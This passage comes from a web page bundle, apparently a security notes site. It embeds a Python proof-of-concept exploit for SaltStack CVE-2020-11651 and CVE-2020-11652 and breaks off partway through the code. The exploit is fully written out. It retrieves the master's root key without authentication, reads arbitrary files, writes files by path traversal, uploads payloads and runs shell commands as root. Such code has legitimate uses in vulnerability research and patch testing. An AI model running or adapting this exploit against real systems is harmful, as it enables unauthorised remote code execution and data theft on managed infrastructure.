class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,1),V={href:"https://github.com/jasperla/CVE-2020-11651-poc/blob/master/exploit.py",target:"_blank",rel:"noopener noreferrer"},S=p(`<div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python</span>
<span class="token comment">#</span>
<span class="token comment"># Exploit for CVE-2020-11651 and CVE-2020-11652</span>
<span class="token comment"># Written by Jasper Lievisse Adriaanse (https://github.com/jasperla/CVE-2020-11651-poc)</span>
<span class="token comment"># This exploit is based on this checker script:</span>
<span class="token comment"># https://github.com/rossengeorgiev/salt-security-backports</span>

<span class="token keyword">from</span> __future__ <span class="token keyword">import</span> absolute_import<span class="token punctuation">,</span> print_function<span class="token punctuation">,</span> unicode_literals
<span class="token keyword">import</span> argparse
<span class="token keyword">import</span> datetime
<span class="token keyword">import</span> os
<span class="token keyword">import</span> os<span class="token punctuation">.</span>path
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> time

<span class="token keyword">import</span> salt
<span class="token keyword">import</span> salt<span class="token punctuation">.</span>version
<span class="token keyword">import</span> salt<span class="token punctuation">.</span>transport<span class="token punctuation">.</span>client
<span class="token keyword">import</span> salt<span class="token punctuation">.</span>exceptions

<span class="token keyword">def</span> <span class="token function">init_minion</span><span class="token punctuation">(</span>master_ip<span class="token punctuation">,</span> master_port<span class="token punctuation">)</span><span class="token punctuation">:</span>
    minion_config <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&#39;transport&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;zeromq&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;pki_dir&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;/tmp&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;id&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;root&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;log_level&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;debug&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;master_ip&#39;</span><span class="token punctuation">:</span> master_ip<span class="token punctuation">,</span>
        <span class="token string">&#39;master_port&#39;</span><span class="token punctuation">:</span> master_port<span class="token punctuation">,</span>
        <span class="token string">&#39;auth_timeout&#39;</span><span class="token punctuation">:</span> <span class="token number">5</span><span class="token punctuation">,</span>
        <span class="token string">&#39;auth_tries&#39;</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
        <span class="token string">&#39;master_uri&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;tcp://{0}:{1}&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>master_ip<span class="token punctuation">,</span> master_port<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">return</span> salt<span class="token punctuation">.</span>transport<span class="token punctuation">.</span>client<span class="token punctuation">.</span>ReqChannel<span class="token punctuation">.</span>factory<span class="token punctuation">(</span>minion_config<span class="token punctuation">,</span> crypt<span class="token operator">=</span><span class="token string">&#39;clear&#39;</span><span class="token punctuation">)</span>

<span class="token comment"># --- check funcs ----</span>

<span class="token keyword">def</span> <span class="token function">check_connection</span><span class="token punctuation">(</span>master_ip<span class="token punctuation">,</span> master_port<span class="token punctuation">,</span> channel<span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[+] Checking salt-master ({}:{}) status... &quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>master_ip<span class="token punctuation">,</span> master_port<span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">&#39;&#39;</span><span class="token punctuation">)</span>
  sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>

  <span class="token comment"># connection check</span>
  <span class="token keyword">try</span><span class="token punctuation">:</span>
    channel<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">&#39;cmd&#39;</span><span class="token punctuation">:</span><span class="token string">&#39;ping&#39;</span><span class="token punctuation">}</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>
  <span class="token keyword">except</span> salt<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>SaltReqTimeoutError<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;OFFLINE&quot;</span><span class="token punctuation">)</span>
    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
  <span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;ONLINE&quot;</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">check_CVE_2020_11651</span><span class="token punctuation">(</span>channel<span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[+] Checking if vulnerable to CVE-2020-11651... &quot;</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">&#39;&#39;</span><span class="token punctuation">)</span>
  sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>

  <span class="token keyword">try</span><span class="token punctuation">:</span>
    rets <span class="token operator">=</span> channel<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">&#39;cmd&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;_prep_auth_info&#39;</span><span class="token punctuation">}</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>
  <span class="token keyword">except</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;ERROR&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token boolean">None</span>
  <span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token keyword">pass</span>
  <span class="token keyword">finally</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> rets<span class="token punctuation">:</span>
      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;YES&#39;</span><span class="token punctuation">)</span>
      root_key <span class="token operator">=</span> rets<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&#39;root&#39;</span><span class="token punctuation">]</span>
      <span class="token keyword">return</span> root_key

  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;NO&#39;</span><span class="token punctuation">)</span>
  <span class="token keyword">return</span> <span class="token boolean">None</span>

<span class="token keyword">def</span> <span class="token function">check_CVE_2020_11652_read_token</span><span class="token punctuation">(</span>debug<span class="token punctuation">,</span> channel<span class="token punctuation">,</span> top_secret_file_path<span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[+] Checking if vulnerable to CVE-2020-11652 (read_token)... &quot;</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">&#39;&#39;</span><span class="token punctuation">)</span>
  sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>

  <span class="token comment"># try read file</span>
  msg <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">&#39;cmd&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;get_token&#39;</span><span class="token punctuation">,</span>
    <span class="token string">&#39;arg&#39;</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token string">&#39;token&#39;</span><span class="token punctuation">:</span> top_secret_file_path<span class="token punctuation">,</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">try</span><span class="token punctuation">:</span>
    rets <span class="token operator">=</span> channel<span class="token punctuation">.</span>send<span class="token punctuation">(</span>msg<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>
  <span class="token keyword">except</span> salt<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>SaltReqTimeoutError<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;YES&quot;</span><span class="token punctuation">)</span>
  <span class="token keyword">except</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;ERROR&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">raise</span>
  <span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>
      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
      <span class="token keyword">print</span><span class="token punctuation">(</span>rets<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;NO&quot;</span><span class="token punctuation">)</span>
  
<span class="token keyword">def</span> <span class="token function">check_CVE_2020_11652_read</span><span class="token punctuation">(</span>debug<span class="token punctuation">,</span> channel<span class="token punctuation">,</span> top_secret_file_path<span class="token punctuation">,</span> root_key<span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[+] Checking if vulnerable to CVE-2020-11652 (read)... &quot;</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">&#39;&#39;</span><span class="token punctuation">)</span>
  sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>

  <span class="token comment"># try read file</span>
  msg <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">&#39;key&#39;</span><span class="token punctuation">:</span> root_key<span class="token punctuation">,</span>
    <span class="token string">&#39;cmd&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;wheel&#39;</span><span class="token punctuation">,</span>
    <span class="token string">&#39;fun&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;file_roots.read&#39;</span><span class="token punctuation">,</span>
    <span class="token string">&#39;path&#39;</span><span class="token punctuation">:</span> top_secret_file_path<span class="token punctuation">,</span>
    <span class="token string">&#39;saltenv&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;base&#39;</span><span class="token punctuation">,</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">try</span><span class="token punctuation">:</span>
    rets <span class="token operator">=</span> channel<span class="token punctuation">.</span>send<span class="token punctuation">(</span>msg<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>
  <span class="token keyword">except</span> salt<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>SaltReqTimeoutError<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;TIMEOUT&quot;</span><span class="token punctuation">)</span>
  <span class="token keyword">except</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;ERROR&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">raise</span>
  <span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>
      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
      <span class="token keyword">print</span><span class="token punctuation">(</span>rets<span class="token punctuation">)</span>
    <span class="token keyword">if</span> rets<span class="token punctuation">[</span><span class="token string">&#39;data&#39;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&#39;return&#39;</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;YES&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;NO&quot;</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">check_CVE_2020_11652_write1</span><span class="token punctuation">(</span>debug<span class="token punctuation">,</span> channel<span class="token punctuation">,</span> root_key<span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[+] Checking if vulnerable to CVE-2020-11652 (write1)... &quot;</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">&#39;&#39;</span><span class="token punctuation">)</span>
  sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>

  <span class="token comment"># try read file</span>
  msg <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">&#39;key&#39;</span><span class="token punctuation">:</span> root_key<span class="token punctuation">,</span>
    <span class="token string">&#39;cmd&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;wheel&#39;</span><span class="token punctuation">,</span>
    <span class="token string">&#39;fun&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;file_roots.write&#39;</span><span class="token punctuation">,</span>
    <span class="token string">&#39;path&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;../../../../../../../../tmp/salt_CVE_2020_11652&#39;</span><span class="token punctuation">,</span>
    <span class="token string">&#39;data&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;evil&#39;</span><span class="token punctuation">,</span>
    <span class="token string">&#39;saltenv&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;base&#39;</span><span class="token punctuation">,</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">try</span><span class="token punctuation">:</span>
    rets <span class="token operator">=</span> channel<span class="token punctuation">.</span>send<span class="token punctuation">(</span>msg<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>
  <span class="token keyword">except</span> salt<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>SaltReqTimeoutError<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;TIMEOUT&quot;</span><span class="token punctuation">)</span>
  <span class="token keyword">except</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;ERROR&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">raise</span>
  <span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>
      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
      <span class="token keyword">print</span><span class="token punctuation">(</span>rets<span class="token punctuation">)</span>

    pp<span class="token punctuation">(</span>rets<span class="token punctuation">)</span>
    <span class="token keyword">if</span> rets<span class="token punctuation">[</span><span class="token string">&#39;data&#39;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&#39;return&#39;</span><span class="token punctuation">]</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">&#39;Wrote&#39;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
      <span class="token keyword">try</span><span class="token punctuation">:</span>
        os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string">&#39;/tmp/salt_CVE_2020_11652&#39;</span><span class="token punctuation">)</span>
      <span class="token keyword">except</span> OSError<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Maybe?&quot;</span><span class="token punctuation">)</span>
      <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;YES&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;NO&quot;</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">check_CVE_2020_11652_write2</span><span class="token punctuation">(</span>debug<span class="token punctuation">,</span> channel<span class="token punctuation">,</span> root_key<span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[+] Checking if vulnerable to CVE-2020-11652 (write2)... &quot;</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">&#39;&#39;</span><span class="token punctuation">)</span>
  sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>

  <span class="token comment"># try read file</span>
  msg <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">&#39;key&#39;</span><span class="token punctuation">:</span> root_key<span class="token punctuation">,</span>
    <span class="token string">&#39;cmd&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;wheel&#39;</span><span class="token punctuation">,</span>
    <span class="token string">&#39;fun&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;config.update_config&#39;</span><span class="token punctuation">,</span>
    <span class="token string">&#39;file_name&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;../../../../../../../../tmp/salt_CVE_2020_11652&#39;</span><span class="token punctuation">,</span>
    <span class="token string">&#39;yaml_contents&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;evil&#39;</span><span class="token punctuation">,</span>
    <span class="token string">&#39;saltenv&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;base&#39;</span><span class="token punctuation">,</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">try</span><span class="token punctuation">:</span>
    rets <span class="token operator">=</span> channel<span class="token punctuation">.</span>send<span class="token punctuation">(</span>msg<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>
  <span class="token keyword">except</span> salt<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>SaltReqTimeoutError<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;TIMEOUT&quot;</span><span class="token punctuation">)</span>
  <span class="token keyword">except</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;ERROR&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">raise</span>
  <span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>
      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
      <span class="token keyword">print</span><span class="token punctuation">(</span>rets<span class="token punctuation">)</span>
    <span class="token keyword">if</span> rets<span class="token punctuation">[</span><span class="token string">&#39;data&#39;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&#39;return&#39;</span><span class="token punctuation">]</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">&#39;Wrote&#39;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
      <span class="token keyword">try</span><span class="token punctuation">:</span>
        os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string">&#39;/tmp/salt_CVE_2020_11652.conf&#39;</span><span class="token punctuation">)</span>
      <span class="token keyword">except</span> OSError<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Maybe?&quot;</span><span class="token punctuation">)</span>
      <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;YES&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;NO&quot;</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">pwn_read_file</span><span class="token punctuation">(</span>channel<span class="token punctuation">,</span> root_key<span class="token punctuation">,</span> path<span class="token punctuation">,</span> master_ip<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[+] Attemping to read {} from {}&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> master_ip<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>

    msg <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&#39;key&#39;</span><span class="token punctuation">:</span> root_key<span class="token punctuation">,</span>
        <span class="token string">&#39;cmd&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;wheel&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;fun&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;file_roots.read&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;path&#39;</span><span class="token punctuation">:</span> path<span class="token punctuation">,</span>
        <span class="token string">&#39;saltenv&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;base&#39;</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span>

    rets <span class="token operator">=</span> channel<span class="token punctuation">.</span>send<span class="token punctuation">(</span>msg<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>rets<span class="token punctuation">[</span><span class="token string">&#39;data&#39;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&#39;return&#39;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>path<span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">pwn_upload_file</span><span class="token punctuation">(</span>channel<span class="token punctuation">,</span> root_key<span class="token punctuation">,</span> src<span class="token punctuation">,</span> dest<span class="token punctuation">,</span> master_ip<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[+] Attemping to upload {} to {} on {}&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span> dest<span class="token punctuation">,</span> master_ip<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        fh <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span> <span class="token string">&#39;rb&#39;</span><span class="token punctuation">)</span>
        payload <span class="token operator">=</span> fh<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
        fh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[-] Failed to read {}: {}&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span>

    msg <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&#39;key&#39;</span><span class="token punctuation">:</span> root_key<span class="token punctuation">,</span>
        <span class="token string">&#39;cmd&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;wheel&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;fun&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;file_roots.write&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;saltenv&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;base&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;data&#39;</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span>
        <span class="token string">&#39;path&#39;</span><span class="token punctuation">:</span> dest<span class="token punctuation">,</span>
    <span class="token punctuation">}</span>

    rets <span class="token operator">=</span> channel<span class="token punctuation">.</span>send<span class="token punctuation">(</span>msg<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[ ] {}&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>rets<span class="token punctuation">[</span><span class="token string">&#39;data&#39;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&#39;return&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">pwn_exec</span><span class="token punctuation">(</span>channel<span class="token punctuation">,</span> root_key<span class="token punctuation">,</span> cmd<span class="token punctuation">,</span> master_ip<span class="token punctuation">,</span> jid<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[+] Attemping to execute {} on {}&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> master_ip<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>

    msg <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&#39;key&#39;</span><span class="token punctuation">:</span> root_key<span class="token punctuation">,</span>
        <span class="token string">&#39;cmd&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;runner&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;fun&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;salt.cmd&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;saltenv&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;base&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;user&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;sudo_user&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;kwarg&#39;</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>
            <span class="token string">&#39;fun&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;cmd.exec_code&#39;</span><span class="token punctuation">,</span>
            <span class="token string">&#39;lang&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;python&#39;</span><span class="token punctuation">,</span>
            <span class="token string">&#39;code&#39;</span><span class="token punctuation">:</span> <span class="token string">&quot;import subprocess;subprocess.call(&#39;{}&#39;,shell=True)&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token string">&#39;jid&#39;</span><span class="token punctuation">:</span> jid<span class="token punctuation">,</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        rets <span class="token operator">=</span> channel<span class="token punctuation">.</span>send<span class="token punctuation">(</span>msg<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
